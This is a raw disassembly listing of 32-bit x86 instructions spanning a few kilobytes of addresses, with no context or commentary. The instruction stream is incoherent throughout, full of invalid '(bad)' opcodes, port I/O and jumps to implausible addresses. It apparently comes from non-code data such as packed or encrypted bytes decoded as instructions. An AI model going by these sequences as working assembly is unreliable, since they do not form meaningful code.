  404864:	int    0x7a
  404866:	sar    BYTE PTR [ecx+0x6634a8ff],cl
  40486c:	mov    esi,0xb771f89
  404871:	push   eax
  404872:	jl     0x404895
  404874:	push   ecx
  404875:	ins    BYTE PTR es:[edi],dx
  404876:	inc    esp
  404877:	in     al,dx
  404878:	dec    edx
  404879:	fdiv   DWORD PTR [edi+0x74e22cf9]
  40487f:	mov    edx,0xe711413a
  404884:	push   es
  404885:	xchg   ebp,eax
  404886:	pop    ss
  404887:	aas    
  404888:	inc    esp
  404889:	cmp    ebp,DWORD PTR [esi+0x5d6f5a58]
  40488f:	out    0xb4,al
  404891:	pushf  
  404892:	cmp    BYTE PTR ds:0xff07edf9,0x63
  404899:	mov    WORD PTR [edi+0x6b48b25b],ss
  40489f:	add    dl,BYTE PTR [edi]
  4048a1:	bndstx [ebx+ebp*4-0x37],bnd3
  4048a6:	sbb    al,BYTE PTR [eax-0x6cce2fc9]
  4048ac:	mov    esp,0xe512174
  4048b1:	retf   
  4048b2:	xlat   BYTE PTR ds:[ebx]
  4048b3:	(bad)
  4048b6:	mov    edx,0xdf287909
  4048bb:	push   ebp
  4048bc:	dec    esi
  4048bd:	icebp  
  4048be:	cs ins BYTE PTR es:[edi],dx
  4048c0:	sub    eax,DWORD PTR [esp+ecx*1-0xce93b84]
  4048c7:	mov    al,ds:0xe2f2a02
  4048cc:	xor    BYTE PTR [ebp-0x4c],dh
  4048cf:	and    eax,0x16d1b2e2
  4048d4:	int    0x14
  4048d6:	cmp    eax,0x6fb757b7
  4048db:	dec    esi
  4048dc:	push   ebx
  4048dd:	xor    eax,0xef3ee1b7
  4048e2:	xchg   BYTE PTR [edi],ch
  4048e4:	test   eax,0x624f7b86
  4048e9:	(bad)  
  4048ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048eb:	loope  0x4048ad
  4048ed:	call   0xeaf46251
  4048f2:	inc    edx
  4048f3:	(bad)  
  4048f4:	out    dx,al
  4048f5:	sbb    esp,DWORD PTR [ecx]
  4048f7:	adc    al,0x36
  4048f9:	mov    ah,BYTE PTR [ebx+0x6d3d86ec]
  4048ff:	(bad)  
  404900:	dec    esi
  404901:	in     eax,0xc2
  404903:	pop    eax
  404904:	inc    eax
  404905:	popa   
  404906:	xor    BYTE PTR [edi],ch
  404908:	popf   
  404909:	jb     0x4048db
  40490b:	inc    ebx
  40490c:	xchg   ecx,eax
  40490d:	or     al,0x43
  40490f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404910:	cwde   
  404911:	data16 adc al,BYTE PTR [ecx+esi*1-0xd]
  404916:	(bad)  
  404917:	lea    eax,[ecx-0x328e7b24]
  40491d:	mov    ebp,0x2d85290e
  404922:	push   0xe4a666fc
  404927:	adc    bl,0xe7
  40492a:	cmp    cl,BYTE PTR [edx-0x778d3d8]
  404930:	test   DWORD PTR [ebp-0x5264ecf6],ebp
  404936:	retf   
  404937:	jb     0x4048ba
  404939:	imul   edi,DWORD PTR [esi-0x63],0xffffffb4
  40493d:	inc    ecx
  40493e:	sbb    BYTE PTR [edx-0x75],bl
  404941:	jnp    0x404971
  404943:	leave  
  404944:	sub    cl,0xf8
  404947:	add    al,0xca
  404949:	sti    
  40494a:	lods   al,BYTE PTR ds:[esi]
  40494b:	and    eax,0xbab4f43f
  404950:	dec    edi
  404951:	mov    DWORD PTR [ecx],ecx
  404953:	in     eax,0x64
  404955:	into   
  404956:	and    DWORD PTR [ecx-0x24],ebx
  404959:	pavgw  mm5,QWORD PTR [ebx+0x6490472f]
  404960:	mov    ecx,0x41958ddd
  404965:	(bad)  
  404966:	pop    esi
  404967:	ins    BYTE PTR es:[edi],dx
  404968:	or     eax,0x6a7dc8b2
  40496d:	cmp    BYTE PTR [ebp+0x554d610b],cl
  404973:	shl    BYTE PTR [ebp-0x35],cl
  404976:	(bad)  
  404977:	xor    al,0xaf
  404979:	sub    bl,BYTE PTR [eax+edx*4+0x10]
  40497d:	push   edi
  40497e:	jns    0x404974
  404980:	test   DWORD PTR [ecx],edi
  404982:	popa   
  404983:	push   ebx
  404984:	or     eax,0xa5599538
  404989:	inc    esi
  40498a:	push   ds
  40498b:	out    dx,al
  40498c:	jg     0x404a02
  40498e:	into   
  40498f:	or     ebx,DWORD PTR [ebx]
  404991:	xor    BYTE PTR [edi+0x4a7644bc],al
  404997:	pop    ebx
  404998:	fbstp  TBYTE PTR [edi-0x3b]
  40499b:	xchg   ecx,eax
  40499c:	ficom  WORD PTR [ecx+eax*1+0x3f120f7b]
  4049a3:	test   DWORD PTR [edi+0x65],ebp
  4049a6:	push   edi
  4049a7:	fadd   st(4),st
  4049a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049aa:	into   
  4049ab:	cmp    DWORD PTR [ebx+ebx*8-0x1],esi
  4049af:	arpl   WORD PTR [ecx-0x25],bp
  4049b2:	jle    0x404a0f
  4049b4:	xlat   BYTE PTR ds:[ebx]
  4049b5:	jbe    0x4049c4
  4049b7:	ins    DWORD PTR es:[edi],dx
  4049b8:	fadd   st,st(4)
  4049ba:	pop    esi
  4049bb:	retf   
  4049bc:	jl     0x404973
  4049be:	push   edi
  4049bf:	add    BYTE PTR [eax],ch
  4049c1:	in     eax,0xa8
  4049c3:	xchg   esi,eax
  4049c4:	outs   dx,BYTE PTR ds:[esi]
  4049c5:	jns    0x40497f
  4049c7:	push   0xd7ceb76d
  4049cc:	test   eax,0x8905f01f
  4049d1:	fsubr  QWORD PTR [edi+0x13]
  4049d4:	sbb    ebp,DWORD PTR [ebx]
  4049d6:	mov    ds:0x4cca93bb,eax
  4049db:	mov    ebx,0xe0c0a056
  4049e0:	das    
  4049e1:	out    dx,eax
  4049e2:	repz pop ecx
  4049e4:	mov    al,al
  4049e6:	pop    ecx
  4049e7:	inc    ebx
  4049e8:	dec    ebx
  4049e9:	mov    edi,0xc241a647
  4049ee:	ret    0x9f8e
  4049f1:	(bad)  
  4049f2:	int    0xb1
  4049f4:	add    al,0xdf
  4049f6:	loop   0x4049a3
  4049f8:	cmp    DWORD PTR [ebp-0x6e],0x9dcd170a
  4049ff:	retf   0x1ce2
  404a02:	enter  0xdf90,0x94
  404a06:	xor    al,ch
  404a08:	xor    BYTE PTR [eax],cl
  404a0a:	mov    edx,DWORD PTR [ebx-0x5a913963]
  404a10:	mov    BYTE PTR ds:0xf14e3bbd,ch
  404a16:	inc    DWORD PTR [ebx-0x367e92d4]
  404a1c:	sub    BYTE PTR [edi],cl
  404a1e:	jns    0x404a05
  404a20:	mov    al,ds:0x295dfb6f
  404a25:	jb     0x404a6e
  404a27:	push   ds
  404a28:	aas    
  404a29:	mov    esp,0x79a5a261
  404a2e:	push   esi
  404a2f:	sub    eax,0x5065c134
  404a34:	jnp    0x404a96
  404a36:	fild   DWORD PTR [ebx-0x30]
  404a39:	sub    al,BYTE PTR [ecx]
  404a3b:	fmul   QWORD PTR [edx-0x27]
  404a3e:	stos   BYTE PTR es:[edi],al
  404a3f:	cmp    ebp,ebx
  404a41:	(bad)  
  404a42:	and    ebp,ebx
  404a44:	(bad)  
  404a45:	push   eax
  404a46:	jns    0x4049d7
  404a48:	mov    esi,es
  404a4a:	push   cs
  404a4b:	std    
  404a4c:	mov    ebx,0xb643b468
  404a51:	and    DWORD PTR [ebp+0x6c],esi
  404a54:	je     0x404ac7
  404a56:	test   al,0x91
  404a58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a59:	push   ds
  404a5a:	sub    al,0x9c
  404a5c:	mov    esp,0x9e4fc134
  404a61:	and    edi,DWORD PTR [edx-0x42]
  404a64:	jg     0x404a58
  404a66:	adc    al,0x61
  404a68:	mov    edx,0xdbe34228
  404a6d:	or     BYTE PTR [ebx+0x5b829d0a],al
  404a73:	shl    DWORD PTR [esi+ecx*1+0x21],0xa8
  404a78:	sub    eax,0x7a4817b3
  404a7d:	icebp  
  404a7e:	mov    edi,edi
  404a80:	(bad)  
  404a81:	jno    0x404ae2
  404a83:	in     eax,0x45
  404a85:	xlat   BYTE PTR ds:[ebx]
  404a86:	bound  ebx,QWORD PTR [ebx+0x17]
  404a89:	stos   BYTE PTR es:[edi],al
  404a8a:	add    BYTE PTR [edi+0x2f],bl
  404a8d:	jno    0x404a56
  404a8f:	jne    0x404af6
  404a91:	(bad)  
  404a92:	push   ss
  404a93:	inc    edx
  404a94:	push   ebx
  404a95:	jae    0x404a84
  404a97:	pushf  
  404a98:	mov    al,ds:0x1a6545b4
  404a9d:	ret    
  404a9e:	mov    edx,0xa9fa6fb3
  404aa3:	sub    BYTE PTR [esi+0x7170fee0],0x84
  404aaa:	jp     0x404aa3
  404aac:	sub    BYTE PTR [ebx+0x31],bl
  404aaf:	jge    0x404ad1
  404ab1:	lahf   
  404ab2:	push   ebx
  404ab3:	jb     0x404ae2
  404ab5:	xor    eax,0xab0880c9
  404aba:	das    
  404abb:	push   ebp
  404abc:	dec    ebp
  404abd:	rcl    DWORD PTR [ebp+ebp*2+0x3cca46de],cl
  404ac4:	dec    esi
  404ac5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ac6:	xchg   al,al
  404ac8:	xor    dl,cl
  404aca:	push   eax
  404acb:	xchg   DWORD PTR [edi+0x712c4938],ebx
  404ad1:	mov    eax,ds:0x4f798b1e
  404ad6:	test   DWORD PTR [eax-0x18d12bf8],ecx
  404adc:	popa   
  404add:	mov    eax,ds:0x7ff30cbb
  404ae2:	cmp    bl,BYTE PTR [eax]
  404ae4:	xor    esi,eax
  404ae6:	push   edi
  404ae7:	popa   
  404ae8:	in     al,0x4a
  404aea:	mov    ?,WORD PTR [ecx+0x3fc18b3a]
  404af0:	push   esi
  404af1:	add    BYTE PTR [ecx+0x1b7cf59b],ch
  404af7:	pop    es
  404af8:	dec    edi
  404af9:	hlt    
  404afa:	mov    edi,0x1d48f6d1
  404aff:	not    DWORD PTR [ebx-0x23bcbdc1]
  404b05:	jae    0x404b83
  404b07:	cmp    al,0xf3
  404b09:	pop    esi
  404b0a:	cmc    
  404b0b:	push   ss
  404b0c:	imul   BYTE PTR [eax+0x6e]
  404b0f:	dec    esi
  404b10:	aam    0xbb
  404b12:	and    DWORD PTR [eax],esp
  404b14:	sbb    esp,esp
  404b16:	mov    eax,DWORD PTR [ecx]
  404b18:	ins    DWORD PTR es:[edi],dx
  404b19:	(bad)  
  404b1a:	rcr    esi,1
  404b1c:	sbb    al,0x21
  404b1e:	test   eax,0x614eabce
  404b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b24:	loop   0x404b47
  404b26:	sub    al,0xe1
  404b28:	sbb    DWORD PTR [ebx+0x8],esp
  404b2b:	rcr    BYTE PTR es:[eax+0x54fa167f],0x6e
  404b33:	mov    ch,0xcd
  404b35:	lods   eax,DWORD PTR ds:[esi]
  404b36:	sbb    bh,BYTE PTR [eax-0x6db914ce]
  404b3c:	ja     0x404ace
  404b3e:	mov    dh,BYTE PTR [edi+0x2]
  404b41:	jp     0x404ae9
  404b43:	call   DWORD PTR [edi+0x1f]
  404b46:	sbb    bl,al
  404b48:	(bad)  
  404b49:	jle    0x404b7d
  404b4b:	repz (bad) 
  404b4e:	sbb    ebp,DWORD PTR [ecx-0x2b]
  404b51:	dec    edi
  404b52:	jle    0x404bb5
  404b54:	pushf  
  404b55:	dec    edx
  404b56:	jnp    0x404b3d
  404b58:	ins    BYTE PTR es:[edi],dx
  404b59:	cli    
  404b5a:	push   edx
  404b5b:	inc    esp
  404b5c:	pop    ecx
  404b5d:	fwait
  404b5e:	lds    ebx,FWORD PTR [ecx+ecx*1+0x24]
  404b62:	pusha  
  404b63:	cmp    dl,ch
  404b65:	(bad)  
  404b66:	call   DWORD PTR [edx-0x55c4bdc2]
  404b6c:	in     al,0x12
  404b6e:	jmp    0x404b76
  404b70:	ja     0x404b51
  404b72:	loopne 0x404b15
  404b74:	aas    
  404b75:	jmp    0x404afa
  404b77:	les    eax,FWORD PTR [ebp+0x169326e4]
  404b7d:	pushf  
  404b7e:	into   
  404b7f:	imul   edx,DWORD PTR [edi-0xb0387c2],0x10038602
  404b89:	sbb    eax,DWORD PTR [ebx]
  404b8b:	ficomp DWORD PTR [eax+0x6e3fcd4e]
  404b91:	inc    ecx
  404b92:	ja     0x404b97
  404b94:	adc    eax,0x61803000
  404b99:	fs sbb eax,0xdbffa6f3
  404b9f:	call   0xcf39c153
  404ba4:	(bad)  
  404ba5:	xchg   esp,eax
  404ba6:	lea    ecx,[ebx]
  404ba8:	aas    
  404ba9:	mov    ebp,0xe03d8370
  404bae:	loop   0x404c0a
  404bb0:	hlt    
  404bb1:	out    0x60,eax
  404bb3:	xchg   edi,eax
  404bb4:	add    eax,0x536c03ac
  404bb9:	lods   al,BYTE PTR ds:[esi]
  404bba:	cmp    DWORD PTR [ecx-0x4562cb41],esi
  404bc0:	inc    ebx
  404bc1:	mov    ebx,0xb8dd4533
  404bc6:	aad    0x0
  404bc8:	sub    BYTE PTR [ebx-0x13],ah
  404bcb:	pop    edi
  404bcc:	mov    ch,0x10
  404bce:	xchg   edx,eax
  404bcf:	inc    esp
  404bd0:	and    BYTE PTR [ebx-0x5208b2d3],dh
  404bd6:	mov    edi,DWORD PTR [ebx+0x48]
  404bd9:	out    dx,eax
  404bda:	cmc    
  404bdb:	out    dx,eax
  404bdc:	mov    eax,0xc0e78b62
  404be1:	push   eax
  404be2:	adc    eax,DWORD PTR [ebx]
  404be4:	(bad)  
  404be5:	xchg   DWORD PTR [ebp+0x66],ecx
  404be8:	iret   
  404be9:	xor    eax,0x4b65bdd1
  404bee:	arpl   WORD PTR [edx+0x59d2c8f],bp
  404bf4:	sti    
  404bf5:	mov    ?,WORD PTR [edi+edi*2-0x72bac90a]
  404bfc:	clc    
  404bfd:	xchg   ecx,eax
  404bfe:	je     0x404bfe
  404c00:	mov    ah,0x37
  404c02:	xor    BYTE PTR [eax-0x74],0xd1
  404c06:	adc    ax,0x1415
  404c0a:	jle    0x404c4b
  404c0c:	shr    DWORD PTR [edx-0x66],1
  404c0f:	push   eax
  404c10:	or     ebx,edx
  404c12:	rcr    DWORD PTR [esi],cl
  404c14:	in     al,0xe0
  404c16:	sub    ch,BYTE PTR ds:0xc5d250b8
  404c1c:	je     0x404c77
  404c1e:	adc    DWORD PTR [edx+eiz*8],eax
  404c21:	mov    DWORD PTR [ebp+0x6a3ccb3c],edx
  404c27:	push   edi
  404c28:	ss push es
  404c2a:	and    BYTE PTR [edx],ch
  404c2c:	sti    
  404c2d:	sti    
  404c2e:	imul   esp,DWORD PTR [edx+0x5c53e33b],0xffffffed
  404c35:	icebp  
  404c36:	shl    BYTE PTR [ebp-0x695f07d9],cl
  404c3c:	mov    ebp,0x13f8b23
  404c41:	jge    0x404c0c
  404c43:	sbb    ebp,DWORD PTR [ecx]
  404c45:	sub    ah,BYTE PTR [eax-0x56]
  404c48:	stc    
  404c49:	fdivr  DWORD PTR [eax+0x11]
  404c4c:	test   DWORD PTR [edi],eax
  404c4e:	and    edi,DWORD PTR [esi]
  404c50:	in     eax,dx
  404c51:	lea    eax,[ecx+0x76316a21]
  404c57:	out    dx,eax
  404c58:	sti    
  404c59:	sub    BYTE PTR [esi-0x64],0x5d
  404c5d:	push   cs
  404c5e:	ss ret 0x7db3
  404c62:	xchg   esp,eax
  404c63:	lock retw 
  404c66:	jmp    0x71d07673
  404c6b:	dec    esi
  404c6c:	inc    ebp
  404c6d:	dec    ebx
  404c6e:	or     bh,BYTE PTR [esi-0x7ad25c5d]
  404c74:	ss add al,0xed
  404c77:	or     DWORD PTR [eax-0x48caa4d3],edi
  404c7d:	(bad)  
  404c7e:	sti    
  404c7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c80:	and    al,0x1a
  404c82:	jb     0x404c21
  404c84:	mov    eax,ds:0xf4837fe0
  404c89:	jb     0x404c77
  404c8b:	loope  0x404ccb
  404c8d:	jle    0x404d08
  404c8f:	and    ch,dl
  404c91:	(bad)  
  404c92:	mov    bl,0x6
  404c94:	call   0x238656b2
  404c99:	adc    BYTE PTR [eax],ah
  404c9b:	adc    eax,0x93732899
  404ca0:	retf   0x127a
  404ca3:	outs   dx,BYTE PTR ds:[esi]
  404ca4:	mov    bh,BYTE PTR [eiz*2+0x11029340]
  404cab:	inc    ecx
  404cac:	xchg   edi,eax
  404cad:	jge    0x404c62
  404caf:	in     eax,0xd4
  404cb1:	ins    DWORD PTR es:[edi],dx
  404cb2:	inc    esp
  404cb3:	nop
  404cb4:	int    0x97
  404cb6:	(bad)  
  404cb7:	ror    BYTE PTR [ecx-0x18],1
  404cba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cbb:	pop    esi
  404cbc:	pusha  
  404cbd:	sahf   
  404cbe:	inc    edi
  404cbf:	mov    ecx,0x9a9f03e
  404cc4:	std    
  404cc5:	fst    QWORD PTR [ebx]
  404cc7:	fst    QWORD PTR [edx]
  404cc9:	push   bp
  404ccb:	je     0x404cdf
  404ccd:	popa   
  404cce:	aas    
  404ccf:	dec    esp
  404cd0:	pop    es
  404cd1:	jecxz  0x404cce
  404cd3:	mov    bh,BYTE PTR [ebx-0x7c]
  404cd6:	dec    ecx
  404cd7:	dec    esp
  404cd8:	and    BYTE PTR [ebx+0x6c7ff79c],dh
  404cde:	ds (bad) 
  404ce0:	inc    eax
  404ce1:	enter  0x8549,0x95
  404ce5:	dec    esi
  404ce6:	mov    esp,0x14fc7a07
  404ceb:	fisubr DWORD PTR [ebx+ecx*4-0x36]
  404cef:	sbb    dl,BYTE PTR [edx+0x4213c8a0]
  404cf5:	sbb    bh,0xf0
  404cf8:	cwde   
  404cf9:	mov    WORD PTR gs:[edi],cs
  404cfc:	mov    ch,0x14
  404cfe:	icebp  
  404cff:	stos   BYTE PTR es:[edi],al
  404d00:	dec    esp
  404d01:	cmc    
  404d02:	cmp    bh,dh
  404d04:	xchg   ebp,eax
  404d05:	dec    ebx
  404d06:	out    0x0,eax
  404d08:	sti    
  404d09:	clc    
  404d0a:	dec    edi
  404d0b:	pop    eax
  404d0c:	xor    BYTE PTR [edi-0x51],bl
  404d0f:	jecxz  0x404cee
  404d11:	ret    
  404d12:	or     eax,0xbe7b5974
  404d17:	es dec edi
  404d19:	mov    BYTE PTR [eax+0x1f],cl
  404d1c:	test   DWORD PTR [eax],eax
  404d1e:	ins    DWORD PTR es:[edi],dx
  404d1f:	rcl    DWORD PTR [ebx],0xa7
  404d22:	push   eax
  404d23:	test   al,bh
  404d25:	xor    eax,0x3786cabb
  404d2a:	adc    al,0x53
  404d2c:	jne    0x404d21
  404d2e:	fs ret 0xdb86
  404d32:	adc    BYTE PTR [edx],dh
  404d34:	xor    eax,0xc0c7e764
  404d39:	jbe    0x404daf
  404d3b:	jl     0x404d4a
  404d3d:	and    DWORD PTR [ebx],edi
  404d3f:	call   0x1fb0:0x95d708b0
  404d46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d47:	add    al,0x97
  404d49:	(bad)  
  404d4a:	or     cl,BYTE PTR [esi]
  404d4c:	jecxz  0x404d5a
  404d4e:	jge    0x404d58
  404d50:	and    DWORD PTR [esi],ebx
  404d52:	mov    bl,0xa3
  404d54:	mov    esi,0x72800f7f
  404d59:	out    0x95,eax
  404d5b:	pop    ebx
  404d5c:	fdiv   DWORD PTR [eax+0x1f87814b]
  404d62:	(bad)  
  404d63:	xchg   edx,eax
  404d64:	les    ecx,FWORD PTR [ecx*1+0x5c4e99b9]
  404d6b:	lods   al,BYTE PTR ds:[esi]
  404d6c:	jmp    0x404cef
  404d6e:	pop    ebp
  404d6f:	push   0xffffffb9
  404d71:	fwait
  404d72:	xor    DWORD PTR [edi-0x26],ebx
  404d75:	popa   
  404d76:	aas    
  404d77:	xor    ch,bl
  404d79:	bound  ebx,QWORD PTR [eax]
  404d7b:	pop    ebx
  404d7c:	and    DWORD PTR [eax-0x5247e6ef],esi
  404d82:	(bad)  
  404d83:	jg     0x404d2f
  404d85:	loop   0x404dd9
  404d87:	rol    ch,0xd3
  404d8a:	fsubrp st(4),st
  404d8c:	leave  
  404d8d:	(bad)  
  404d8e:	xor    bh,BYTE PTR [edx]
  404d90:	jb     0x404d83
  404d92:	cmp    esi,DWORD PTR [ebx+0x48]
  404d95:	lahf   
  404d96:	das    
  404d97:	mov    ds:0xd56501aa,al
  404d9c:	jp     0x404e17
  404d9e:	fisttp QWORD PTR [edx]
  404da0:	shr    BYTE PTR [ecx-0x46],1
  404da3:	es adc eax,0xd8b7e2f7
  404da9:	mov    ebx,0x21b204c
  404dae:	and    eax,ebx
  404db0:	pushf  
  404db1:	mov    dh,0x4c
  404db3:	and    bh,BYTE PTR ds:0x8b7a7ce7
  404db9:	sbb    DWORD PTR [esi-0x45],edi
  404dbc:	push   cs
  404dbd:	or     DWORD PTR [esi+0x6841798b],ecx
  404dc3:	loope  0x404e2f
  404dc5:	cmp    al,0x29
  404dc7:	aas    
  404dc8:	ror    BYTE PTR [eax+0xdae08c8],1
  404dce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dcf:	ret    
  404dd0:	cmp    DWORD PTR [ebp+0x74392d25],esi
  404dd6:	adc    DWORD PTR ds:0xb5980337,eax
  404ddc:	push   eax
  404ddd:	sub    BYTE PTR [edx],bh
  404ddf:	sar    DWORD PTR [esi+0x25],cl
  404de2:	mov    ah,BYTE PTR [ebx+0x74]
  404de5:	mul    BYTE PTR [ebx]
  404de7:	pop    esp
  404de8:	cwde   
  404de9:	nop
  404dea:	jae    0x404deb
  404dec:	pop    esi
  404ded:	shl    DWORD PTR [edi],cl
  404def:	sahf   
  404df0:	scas   al,BYTE PTR es:[edi]
  404df1:	cmp    edx,DWORD PTR [ebp-0x71]
  404df4:	xchg   DWORD PTR [ebx+0x71f0171b],edx
  404dfa:	mov    ebx,0x18ad2c9a
  404dff:	jmp    0x6e7b:0xbc417c21
  404e06:	or     ebp,0xffffffc2
  404e09:	(bad)  
  404e0a:	pop    ds
  404e0b:	lahf   
  404e0c:	dec    ebp
  404e0d:	(bad)  
  404e0e:	push   eax
  404e0f:	addr16 fwait
  404e11:	hlt    
  404e12:	out    0x36,al
  404e14:	rcl    BYTE PTR ds:[ebx+0x24eb5e0d],cl
  404e1b:	aam    0xc4
  404e1d:	int3   
  404e1e:	pop    es
  404e1f:	imul   esp,DWORD PTR ds:0xfd66b12e,0x53
  404e26:	loopne 0x404daf
  404e28:	inc    ebp
  404e29:	push   ds
  404e2a:	mov    ds:0xd0069b6d,al
  404e2f:	mov    al,0x43
  404e31:	mov    WORD PTR [ecx-0x443c99c2],ss
  404e37:	loopne 0x404dd9
  404e39:	sbb    ecx,eax
  404e3b:	xchg   BYTE PTR [edx],dh
  404e3d:	inc    esi
  404e3e:	mov    esp,0x2cb77ed5
  404e43:	pand   mm6,mm0
  404e46:	std    
  404e47:	int3   
  404e48:	mov    eax,0x3b489316
  404e4d:	add    BYTE PTR [edi],bl
  404e4f:	xor    dl,BYTE PTR [ecx+0x60]
  404e52:	test   DWORD PTR [esi-0x6f2beb25],ecx
  404e58:	push   eax
  404e59:	xchg   bh,bl
  404e5b:	pop    ecx
  404e5c:	jmp    0x441fc5d
  404e61:	jge    0x404e53
  404e63:	shr    BYTE PTR ds:0x24f5041f,1
  404e69:	mov    dh,0xda
  404e6b:	sbb    esp,DWORD PTR [ecx]
  404e6d:	or     DWORD PTR [eax+0x607f03ef],esi
  404e73:	push   0xffffffde
  404e75:	call   0x8a8b:0x3bc5fa1f
  404e7c:	loopne 0x404e03
  404e7e:	jno    0x404ed5
  404e80:	(bad)  
  404e82:	(bad)  
  404e84:	or     BYTE PTR [edi-0x1cd6f602],dl
  404e8a:	test   BYTE PTR [ebp+ecx*2-0xf],ah
  404e8e:	fadd   QWORD PTR [edx-0x703cd2]
  404e94:	out    dx,eax
  404e95:	cmp    edx,ecx
  404e97:	dec    ecx
  404e98:	sbb    bl,BYTE PTR [edx+eiz*1+0x1a]
  404e9c:	int3   
  404e9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e9e:	(bad)  
  404ea0:	fsubr  QWORD PTR [edi+0x63ff8e29]
  404ea6:	xor    eax,0x61549aed
  404eab:	gs pop ebp
  404ead:	scas   eax,DWORD PTR es:[edi]
  404eae:	push   0xd82cdff3
  404eb3:	(bad)  
  404eb5:	mov    ch,0xec
  404eb7:	sbb    ebx,DWORD PTR [edx-0x4f]
  404eba:	mov    ds:0x5d8f4ba,eax
  404ebf:	and    eax,0x6b00a51e
  404ec4:	loope  0x404e9b
  404ec6:	sub    BYTE PTR [edi+0x6551114c],0xad
  404ecd:	dec    ecx
  404ece:	pop    edx
  404ecf:	add    DWORD PTR [edx+0x50],ebp
  404ed2:	jp     0x404f22
  404ed4:	sbb    ch,cl
  404ed6:	and    ax,0x85be
  404eda:	jmp    0x404e5f
  404edc:	adc    DWORD PTR [ebp-0x9],ebp
  404edf:	arpl   WORD PTR [esi-0x4b140863],cx
  404ee5:	pop    ebp
  404ee6:	int3   
  404ee7:	out    0x3e,eax
  404ee9:	scas   al,BYTE PTR es:[edi]
  404eea:	and    esi,ecx
  404eec:	and    al,BYTE PTR [eax]
  404eee:	test   BYTE PTR ds:0xb44723,bl
  404ef4:	add    al,0x96
  404ef6:	cmp    ebx,ecx
  404ef8:	pop    ds
  404ef9:	and    bh,bl
  404efb:	dec    ebx
  404efc:	xchg   esp,eax
  404efd:	xor    DWORD PTR [edi+0x52],ebp
  404f00:	sbb    DWORD PTR ds:0x71d180d4,esp
  404f06:	idiv   BYTE PTR [edi]
  404f08:	(bad)  
  404f09:	cdq    
  404f0a:	jecxz  0x404eed
  404f0c:	jmp    DWORD PTR [ebx]
  404f0e:	in     eax,dx
  404f0f:	push   0xffffffbf
  404f11:	push   0xbc4c7aae
  404f16:	mov    ebp,0x8a4764a5
  404f1b:	or     eax,0x3997cac9
  404f20:	jnp    0x404f8e
  404f22:	or     al,0x9e
  404f24:	inc    ebp
  404f25:	(bad)  
  404f26:	(bad)  
  404f28:	add    al,0xf4
  404f2a:	jae    0x404f0d
  404f2c:	sbb    DWORD PTR [ecx+0x1eee778a],edx
  404f32:	jle    0x404f18
  404f34:	out    dx,eax
  404f35:	dec    ebx
  404f36:	xor    al,0x6
  404f38:	std    
  404f39:	scas   eax,DWORD PTR es:[edi]
  404f3a:	(bad)  
  404f3b:	push   ebp
  404f3c:	shl    ah,cl
  404f3e:	in     al,dx
  404f3f:	(bad)  
  404f40:	mov    ecx,DWORD PTR [eax+0x349992de]
  404f46:	std    
  404f47:	jmp    0xa918:0x60472637
  404f4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f4f:	pop    es
  404f50:	in     al,0x9d
  404f52:	out    dx,al
  404f53:	cmp    ebx,DWORD PTR [ebp+0x5d878e17]
  404f59:	pop    eax
  404f5a:	inc    eax
  404f5b:	jbe    0x404f13
  404f5d:	aaa    
  404f5e:	xor    BYTE PTR [edi-0x13],ah
  404f61:	and    eax,0xccafedc7
  404f66:	dec    esp
  404f67:	mov    ebp,ds
  404f69:	aaa    
  404f6a:	das    
  404f6b:	icebp  
  404f6c:	fidiv  WORD PTR [ecx-0x30d982f4]
  404f72:	mov    edx,0x19c97d21
  404f77:	xchg   ecx,eax
  404f78:	shl    DWORD PTR [ebx+0x58e3831],cl
  404f7e:	repz mov edi,DWORD PTR [ebx+0x15834120]
  404f85:	mov    esp,es
  404f87:	gs int 0x61
  404f8a:	push   ebx
  404f8b:	sbb    esp,DWORD PTR [eax-0x5c4582f7]
  404f91:	aas    
  404f92:	lea    ebx,[edx+0x2d]
  404f95:	cmp    eax,0x1fdba18e
  404f9a:	mov    BYTE PTR [ebx+0x76],dh
  404f9d:	mov    bh,0xe1
  404f9f:	xor    BYTE PTR [edx-0x50],cl
  404fa2:	mov    bh,BYTE PTR [ebx-0x2278e154]
  404fa8:	sub    al,0x7e
  404faa:	xchg   esp,eax
  404fab:	mov    edi,0xd83c163c
  404fb0:	shl    BYTE PTR [ecx+0x29],cl
  404fb3:	in     al,0x21
  404fb5:	test   DWORD PTR [edi+0x68],edx
  404fb8:	lahf   
  404fb9:	or     al,0x5
  404fbb:	and    DWORD PTR [ebx+0x201e9127],edx
  404fc1:	mov    dh,0x83
  404fc3:	mov    cl,0x9b
  404fc5:	mov    BYTE PTR [eax+0x7f19fc98],bh
  404fcb:	xchg   esi,eax
  404fcc:	mov    ds:0x6ccfca67,eax
  404fd1:	cmc    
  404fd2:	dec    ecx
  404fd3:	xlat   BYTE PTR es:[ebx]
  404fd5:	inc    ebx
  404fd6:	ss in  eax,dx
  404fd8:	imul   ebp,DWORD PTR [ecx-0x7a],0x25b1ce9e
  404fdf:	jl     0x405033
  404fe1:	mov    DWORD PTR [edx+0x215c2f2d],edx
  404fe7:	add    al,0x9d
  404fe9:	sub    BYTE PTR [ebp+eax*4+0x355badaf],cl
  404ff0:	clc    
  404ff1:	adc    edx,DWORD PTR [ecx-0x126b8b17]
  404ff7:	xchg   esp,eax
  404ff8:	pop    edx
  404ff9:	add    esi,ecx
  404ffb:	push   0x65
  404ffd:	test   BYTE PTR [ecx-0x3d],bh
  405000:	jns    0x40501f
  405002:	icebp  
  405003:	inc    ebp
  405004:	es push edi
  405006:	js     0x404fb4
  405008:	sbb    BYTE PTR [esi+0x31],0xe5
  40500c:	fimul  DWORD PTR [ebx-0x29]
  40500f:	xchg   edi,esi
  405011:	jbe    0x404fcc
  405013:	dec    edx
  405014:	nop
  405015:	loop   0x405094
  405017:	or     al,BYTE PTR [ecx]
  405019:	lds    esp,FWORD PTR ds:0x1a1a3bfa
  40501f:	shl    BYTE PTR [esi+0x26],1
